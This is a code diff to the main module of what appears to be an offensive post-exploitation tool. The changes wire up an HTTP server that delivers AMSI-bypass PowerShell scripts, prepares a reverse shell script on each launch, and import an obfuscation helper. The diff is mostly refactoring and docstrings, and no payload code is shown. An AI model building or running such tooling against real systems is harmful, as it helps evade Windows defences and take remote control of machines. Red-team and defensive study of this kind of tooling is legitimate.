@@ -3,10 +3,11 @@ from time import sleep
 from rich.traceback import install
 from http_handler.http_server import HttpServer, HttpDeliveringServer
 from req_handler.connection_handler import ConnectionHandler
-from utils.pwsh_utils import PwshUtils
+from utils.minishh_utils import MinishhUtils
+from utils.pwsh_utils import PwshUtils, ObfUtil
 from utils.print_utils import Printer
 from utils.ipaddr import IpAddr
-from config.config import AppConfig, MinishhRequirements
+from config.config import AppConfig, MinishhRequirements, RequirementsError
 from commands.menu_command import MenuCommand
 from prompt_toolkit.formatted_text import ANSI
 
@@ -30,10 +31,19 @@ class Main:
             "default_ip_address",
             ip_manager.get_default(
                 AppConfig.get("default", "Interfaces")
-                )
-            )
+                ),
+            section="UserSection",
+            force=True
+            ) # Set the ip address to the default interface, and overwrite if already present
 
     def safe_start_server(self, server):
+        """
+        This function starts all server by calling common method
+        It first starts the server
+        Then it waits for it to finish the initialisation
+        Finally, it checks if everything went well and that the server is listening
+        Otherwise exit in case of failure
+        """
         server.start()
         server.has_started.wait()
         if not(server.is_listening):
@@ -54,17 +64,21 @@ class Main:
         Init default routes for the http server
         Route for disabling amsi by patching the DLL in 2 steps are enabled by default
         and bound to the script associated
+        
+        Example:
+        amsi_bypass_script=amsi.ps1
+        AppConfig.get_and_set_if_not_exists("scripts/amsi.ps1", random_route.log, "Routes")
         """
         HttpDeliveringServer.init_permanent_route({
           AppConfig.get("amsi_route1", "Routes")         : AppConfig.get('amsi_step1', 'Script'),
           AppConfig.get("amsi_route2", "Routes")         : AppConfig.get('amsi_step2', 'Script')
         })
 
-        # script = "scripts/test.ps1"
-        # route_for_script = AppConfig.get_and_set_if_not_exists(script, "random_route.log", "Routes")
-        # HttpDeliveringServer.init_permanent_route({
-        #     route_for_script : script
-        #     })
+        script = "scripts/test.ps1"
+        route_for_script = AppConfig.get_and_set_if_not_exists(script, "random_route.log", "Routes")
+        HttpDeliveringServer.init_permanent_route({
+            route_for_script : script
+            })
         # Init the reverse shell script each times it is launched
         self.http_server.prepare_rev_shell_script()
         self.socket_server.set_download_server(self.http_server)
@@ -117,7 +131,7 @@ if __name__ == '__main__':
 
     try:
         MinishhRequirements.check_requirements()
-    except Exception as e:
+    except RequirementsError as e:
         Printer.err(e)
         exit(1)
 
